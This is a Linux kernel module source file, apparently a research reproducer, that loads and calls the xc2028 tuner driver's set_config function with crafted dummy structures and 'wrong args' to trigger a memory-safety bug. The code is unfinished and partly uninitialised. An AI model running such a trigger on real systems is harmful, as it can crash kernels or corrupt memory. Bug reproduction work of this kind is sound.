#include <linux/init.h>
#include <linux/module.h>
#include <linux/mutex.h>    // for mutex_init
#include "tuner-xc2028.h"

MODULE_LICENSE("GPL");

#define FIRM_NAME "foo_firmware"

extern int xc2028_set_config(struct dvb_frontend *fe, void *priv_cfg);
extern struct dvb_frontend *xc2028_attach(struct dvb_frontend *fe,
				   struct xc2028_config *cfg);


//static struct dvb_frontend_ops dummy_ops;
static struct dvb_frontend dummy_fe;

void exploit_test(void) {
    /* Calling xc2028_set_config.
     * - Need to pass a dvb_frontend with a tuner_priv.
     * - Need to set a fname for dummy_ctrl (fe.tuner_priv.ctrl.fname) and
     *      for dummy_priv_cfg.
     * - Give dummy_fe a ctrl field.
     * - Need to mutex_init this tuner_priv.lock field.
     * - Don't think need the ops field.
     * - Just need to initialize priv_cfg to a xc2028_ctrl struture?
     */
    /* SHOULD WRITE THE TRUE STORY HERE.
     */
    struct xc2028_data dummy_data;
    struct xc2028_ctrl dummy_ctrl;
    struct xc2028_ctrl dummy_priv_cfg;

    dummy_priv_cfg.fname = FIRM_NAME;

    dummy_data.state = XC2028_ACTIVE;
    mutex_init(&dummy_data.lock);
    dummy_fe.tuner_priv = (void*) &dummy_data;
    dummy_data.fname = FIRM_NAME;
    dummy_data.ctrl = dummy_ctrl;
    dummy_ctrl.fname = FIRM_NAME;

    printk("Going to call xc2028_set_config with wrong args\n");
    xc2028_set_config(&dummy_fe, (void*) &dummy_priv_cfg);
    printk("drivers/media/tuners/exploit_test.c: end of exploit_test!!\n");
}

static int test_init(void) {
    printk("Bonjour from test_init :-)\n");
    exploit_test();
    return 0;
}

static void test_exit(void) {
    printk("Au revoir from test_exit\n");
}

module_init(test_init);
module_exit(test_exit);
